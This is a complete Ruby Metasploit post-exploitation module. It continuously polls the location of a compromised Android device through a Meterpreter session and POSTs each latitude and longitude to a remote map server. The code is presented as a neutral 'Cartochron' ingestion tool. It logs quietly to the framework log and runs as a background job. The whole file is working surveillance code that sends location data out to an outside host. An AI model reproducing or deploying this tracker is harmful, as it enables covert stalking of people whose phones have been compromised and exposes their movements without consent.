require 'json'
require 'net/http'
require 'securerandom'
require 'uri'

class MetasploitModule < Msf::Post
  include Msf::Post::Android::System

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'         => 'Android GPS Streamer to Map Server',
        'Description'  => 'Continuously streams GPS observations via HTTP POST. Use run -j to keep msfconsole interactive.',
        'License'      => 'GPL-3.0-or-later',
        'Author'       => ['sighook'],
        'Platform'     => ['android'],
        'SessionTypes' => ['meterpreter']
      )
    )

    register_options([
      OptInt.new('INTERVAL', [true, 'Seconds between GPS polls', 5]),
      OptString.new('ENDPOINT', [true, 'Target server endpoint URL', 'http://127.0.0.1:8765/api/position']),
      OptString.new('MAP_USER', [false, 'HTTP Basic username for the map server', '']),
      OptString.new('MAP_PASSWORD', [false, 'HTTP Basic password for the map server', '']),
      OptString.new('TRACK_ID', [false, 'Recording-run ID (generated for each job if omitted)', '']),
      OptString.new('SOURCE_ID', [false, 'Operator-enrolled Cartochron source ID (not a device fingerprint)', ''])
    ])
  end

  # The module is a Metasploit job, not an independent logging service.
  # Framework messages go to framework.log; print_* would go to the shared
  # console and interrupt the operator's Meterpreter interaction.
  REPORT_INTERVAL = 60

  def run
    interval = datastore['INTERVAL']
    endpoint = datastore['ENDPOINT']
    map_user = datastore['MAP_USER'].to_s
    map_password = datastore['MAP_PASSWORD'].to_s
    track_id = datastore['TRACK_ID'].to_s
    source_id = datastore['SOURCE_ID'].to_s
    track_id = SecureRandom.uuid if track_id.empty?
    uri = URI.parse(endpoint)
    unless uri.is_a?(URI::HTTP) && uri.host && !uri.userinfo
      print_error('ENDPOINT must be an http:// or https:// URL without embedded credentials')
      return
    end
    if map_user.empty? != map_password.empty?
      print_error('MAP_USER and MAP_PASSWORD must either both be set or both be empty')
      return
    end

    unless /\A[A-Za-z0-9][A-Za-z0-9._-]{0,63}\z/.match?(track_id)
      print_error('TRACK_ID must be 1-64 ASCII letters, digits, dots, underscores or hyphens')
      return
    end

    unless source_id.empty? || /\Asrc_[0-9a-f]{24}\z/.match?(source_id)
      print_error('SOURCE_ID must be an enrolled Cartochron src_ identifier')
      return
    end

    counts = { accepted: 0, rejected: 0, unavailable: 0, errors: 0 }
    previous = nil
    last_report = Process.clock_gettime(Process::CLOCK_MONOTONIC)
    ilog("[Cartochron] Started run=#{track_id} source=#{source_id.empty? ? 'unassigned' : source_id} destination=#{uri.scheme}://#{uri.host}:#{uri.port} interval=#{interval}s")
    ilog('[Cartochron] Meterpreter geolocate uses last-known network location; fix age and accuracy unavailable')

    loop do
      outcome = :unavailable
      detail = nil

      begin
        # Meterpreter's Android geolocate returns NETWORK_PROVIDER's last-known
        # location, not a fresh GPS measurement. Its age and accuracy are unknown.
        locations = client.android.geolocate if client.respond_to?(:android) &&
                                          client.android.respond_to?(:geolocate)

        if locations.is_a?(Array) && !locations.empty?
          loc = locations.first
          lat = loc['lat'] || loc[:lat]
          lon = loc['long'] || loc[:long] || loc['lon'] || loc[:lon]

          if lat && lon && lat.to_f != 0.0 && lon.to_f != 0.0
            response = submit_position(uri, lat.to_f, lon.to_f, map_user, map_password,
                                       track_id, source_id.empty? ? nil : source_id)
            if response.is_a?(Net::HTTPSuccess)
              outcome = :accepted
              dlog("[Cartochron] Observation accepted run=#{track_id}", 'core', 2)
            else
              outcome = :rejected
              detail = response.code.to_i == 401 ? "HTTP 401 (check MAP_USER/MAP_PASSWORD)" : "HTTP #{response.code}"
            end
          end
        end
      rescue ::StandardError => e
        outcome = :errors
        detail = e.class.to_s
      end

      counts[outcome] += 1
      state = [outcome, detail]
      if state != previous
        log_transition(track_id, state, previous)
        previous = state
      end

      now = Process.clock_gettime(Process::CLOCK_MONOTONIC)
      if now - last_report >= REPORT_INTERVAL
        ilog("[Cartochron] Progress run=#{track_id} #{format_counts(counts)}")
        last_report = now
      end
      sleep(interval)
    end
  ensure
    ilog("[Cartochron] Stopped run=#{track_id} #{format_counts(counts)}") if counts
  end

  def log_transition(track_id, state, previous)
    outcome, detail = state
    case outcome
    when :accepted
      ilog("[Cartochron] Ingestion #{previous ? 'recovered' : 'established'} run=#{track_id}")
    when :unavailable
      wlog("[Cartochron] No usable location fix run=#{track_id}")
    when :rejected
      wlog("[Cartochron] Ingestion rejected run=#{track_id} #{detail}")
    when :errors
      elog("[Cartochron] Ingestion error run=#{track_id} type=#{detail}")
    end
  end

  def format_counts(counts)
    "accepted=#{counts[:accepted]} rejected=#{counts[:rejected]} " \
      "unavailable=#{counts[:unavailable]} errors=#{counts[:errors]}"
  end

  def submit_position(uri, lat, lon, username, password, track_id = nil, source_id = nil)
    http = Net::HTTP.new(uri.host, uri.port)
    http.use_ssl = uri.scheme == 'https'
    http.open_timeout = 5
    http.read_timeout = 5

    request = Net::HTTP::Post.new(uri.request_uri, 'Content-Type' => 'application/json')
    request.basic_auth(username, password) unless username.empty?
    observation = { lat: lat, lon: lon }
    observation[:track_id] = track_id if track_id
    observation[:source_id] = source_id if source_id
    request.body = observation.to_json
    http.request(request)
  end
end
